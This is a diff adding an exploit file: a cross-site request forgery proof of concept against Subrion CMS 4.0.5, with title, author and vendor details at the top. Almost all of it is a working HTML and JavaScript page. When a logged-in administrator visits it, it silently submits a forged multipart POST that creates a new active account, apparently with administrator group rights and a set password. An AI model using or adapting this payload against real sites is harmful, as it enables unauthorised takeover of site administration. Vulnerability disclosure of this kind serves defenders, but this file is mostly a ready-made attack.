@@ -1,0 +1,138 @@
+# Exploit Title:  Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)
+# Date: 2020-01-05
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://intelliants.com/
+# Software Link : https://github.com/intelliants/subrion/releases/tag/v4.0.5
+# Software : Subrion CMS
+# Product Version: v 4.0.5.10
+# Vulernability Type : Cross-Site Request Forgery (Add Admin)
+# Vulenrability : Cross-Site Request Forgery
+# CVE : N/A
+
+# Description :
+# CSRF vulnerability was discovered in v4.0.5 version of Subrion CMS.
+# With this vulnerability, authorized users can be added to the system.
+
+HTML CSRF PoC :
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/SERVER\/_core\/admin\/members\/add\/", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------9973334999367242361642875270");
+        xhr.withCredentials = true;
+        var body = "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"__st\"\r\n" +
+          "\r\n" +
+          "41209a5f43b0d7c8cef0e7ffcd9ce160\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"username\"\r\n" +
+          "\r\n" +
+          "ismailtasdelen\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"fullname\"\r\n" +
+          "\r\n" +
+          "Ismail Tasdelen\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"email\"\r\n" +
+          "\r\n" +
+          "test@mail.com\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"_password\"\r\n" +
+          "\r\n" +
+          "Test1234!\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"_password2\"\r\n" +
+          "\r\n" +
+          "Test1234!\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"usergroup_id\"\r\n" +
+          "\r\n" +
+          "1\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"v[avatar[]]\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"avatar[]\"; filename=\"\"\r\n" +
+          "Content-Type: application/octet-stream\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"website\"\r\n" +
+          "\r\n" +
+          "https://ismailtasdelen.com\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"phone\"\r\n" +
+          "\r\n" +
+          "0000000000000000000\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"biography\"\r\n" +
+          "\r\n" +
+          "NULL\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"facebook\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"twitter\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"gplus\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"linkedin\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"sponsored\"\r\n" +
+          "\r\n" +
+          "0\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"plan_id\"\r\n" +
+          "\r\n" +
+          "2\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"sponsored_end\"\r\n" +
+          "\r\n" +
+          "2020-02-05 05:18:43\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"featured\"\r\n" +
+          "\r\n" +
+          "0\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"featured_end\"\r\n" +
+          "\r\n" +
+          "2020-02-05 05:19\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"status\"\r\n" +
+          "\r\n" +
+          "active\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"save\"\r\n" +
+          "\r\n" +
+          "Add\r\n" +
+          "-----------------------------9973334999367242361642875270\r\n" +
+          "Content-Disposition: form-data; name=\"goto\"\r\n" +
+          "\r\n" +
+          "list\r\n" +
+          "-----------------------------9973334999367242361642875270--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
